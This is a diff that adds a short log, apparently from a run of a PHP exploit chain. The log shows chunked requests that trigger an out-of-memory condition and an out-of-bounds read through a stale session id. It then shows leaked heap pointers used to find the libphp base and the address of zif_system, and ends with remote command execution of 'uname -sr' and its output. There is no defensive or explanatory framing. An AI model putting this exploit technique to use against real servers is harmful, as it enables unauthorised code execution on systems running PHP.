@@ -1,0 +1,14 @@
+
+=== 2026-10-23T08:47:08.252313+00:00 ===
+[*] exec: uname -sr
+[try 1/3] A1: END-cleanup send_cookie OOM
+      A1 body generated; sending chunked END-cleanup OOM
+      A1 -> status='HTTP/1.0 500 Internal Server Error' bytes=211 set-cookie=none
+      B1 body generated; sending chunked stale-id OOB read
+      B1 -> status='HTTP/1.1 200 OK' bytes=1249459 set-cookie=[1249240]
+      decoded=819208 zval_ptr_dtor=0x7f7245458b50 -> libphp=0x7f7244fbb000
+      chunk buckets: [('0x7f723b200000', 3527), ('0x7f7245400000', 1168), ('0x7f723bc00000', 165)]
+      dtor anchor: bucket=0x7f7245400000 carrier_chunk=0x7f7243400000
+[try 1] A2 + B2 (1/1): base=0x7f7243400000 S=0x7f72434f9398 zif_system=0x7f7245366dc0
+[+] output (/out/o18a30d1e):
+Linux 5.15.153.1-microsoft-standard-WSL2
